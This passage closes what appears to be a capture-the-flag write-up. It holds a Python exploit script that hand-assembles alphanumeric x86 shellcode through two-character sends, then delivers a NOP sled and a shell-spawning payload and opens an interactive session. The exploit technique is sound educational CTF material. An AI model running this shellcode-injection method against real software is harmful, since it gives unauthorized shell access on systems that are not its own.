xor    al,0x43 ; 4C
ss inc ecx ; 6A
and    edi,DWORD PTR [eax] ; #8
'''
send("A4")
send("B4")
send("C6")
send("A#8")


'''
; A4 A6 A0 D8 A6 (6 is used in next step)
inc    ecx ; A
xor    al,0x41 ; 4A
ss inc ecx ; 6A
xor    BYTE PTR [eax+edi*1+0x41],al ; 0D8A
'''
send("A4")
send("A6")
send("A0")
send("D8")
send("A6")


'''
; 6 F6 F6 F6 F1 F0 F6 F6 F6 F1 F0
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
xor    DWORD PTR [esi+0x30],eax ; 1F0

inc    esi ; F
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
xor    DWORD PTR [esi+0x30],eax ; 1F0
'''
writePopaStackValue()
writePopaStackValue()



'''
; A3 F0 A4 A4 B6 (6 is used in next step)
inc    ecx ; A
xor    eax,DWORD PTR [esi+0x30] ; 3F0
inc    ecx ; A
xor    al,0x41 ; 4A
xor    al,0x42 ; 4B
'''
send("A3")
send("F0")
send("A4")
send("A4")
send("B6")



'''
; 6 F6 F6 F6 F1 F0
ss     inc esi ; 6F
ss     inc esi ; 6F
ss     inc esi ; 6F
ss     inc esi ; 6F
xor    DWORD PTR [esi+0x30], eax ; 1F0
'''
writePopaStackValue()


'''
; D6 * 32
inc    esp  
ss inc esp
'''
loopSend("D6", 32)

'''
; A6
ss inc ecx ; A6 (400 times)
'''
loopSend("A6", 400)

# Send these two null byte so the target will stop scanning initial shellcode
target.send("\x00"*2)

# Make secondary shellcode
secondaryShellcode = "\x90"*1000

context = 'i386'
secondaryShellcode += asm(shellcraft.sh())

target.send(secondaryShellcode)

target.interactive()
```

I would like to say, thanks again to the person who made the writeup that this is based off of.
